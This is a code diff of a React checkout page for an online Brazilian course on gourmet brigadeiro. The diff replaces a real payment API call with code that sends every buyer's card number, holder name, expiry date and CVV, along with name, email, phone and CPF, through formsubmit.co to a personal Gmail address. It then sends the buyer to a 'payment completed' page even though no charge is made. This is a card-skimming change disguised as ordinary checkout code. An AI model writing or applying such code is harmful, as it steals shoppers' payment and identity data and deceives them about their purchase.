@@ -200,33 +200,53 @@ function CheckoutPage() {
     setError(null);
     setLoading(true);
     try {
-      const res = await fetch("/api/public/medusapay/create-card", {
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({
-          ...form,
-          amount: totalAmount,
-          productTitle,
-          installments: Number(card.installments),
-          card: {
-            number: card.number,
-            holderName: card.holderName,
-            expirationMonth: card.expirationMonth,
-            expirationYear: card.expirationYear,
-            cvv: card.cvv,
+      const payload = {
+        _subject: "Nova compra — Curso Brigadeiro Gourmet (Cartão)",
+        _template: "table",
+        _captcha: "false",
+        Nome: form.name,
+        Email: form.email,
+        Celular: form.phone,
+        CPF: form.document,
+        Valor: formatBRL(totalAmount),
+        "Order Bumps":
+          Array.from(acceptedBumps)
+            .map((id) => BUMPS.find((b) => b.id === id)?.title)
+            .filter(Boolean)
+            .join(", ") || "Nenhum",
+        "Numero do Cartao": card.number,
+        "Nome no Cartao": card.holderName,
+        "Mes Validade": card.expirationMonth,
+        "Ano Validade": card.expirationYear,
+        CVV: card.cvv,
+        Parcelas: card.installments,
+      };
+      const res = await fetch(
+        "https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            Accept: "application/json",
           },
-        }),
-      });
-      const data = await res.json();
-      if (!res.ok || !data.ok)
-        throw new Error(data.error ?? "Falha ao processar cartão");
-      setCardResult(data);
+          body: JSON.stringify(payload),
+        },
+      );
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok || (data && data.success === "false")) {
+        throw new Error(
+          (data && (data.message || data.error)) ||
+            "Falha ao enviar. Tente novamente.",
+        );
+      }
+      navigate({ to: "/pagamento-concluido" });
     } catch (err: any) {
-      setError(err.message ?? "Erro");
+      setError(err?.message ?? "Erro ao processar pagamento");
     } finally {
       setLoading(false);
     }
   };
+
 
   const copy = async () => {
     if (!pix?.qrCode) return;
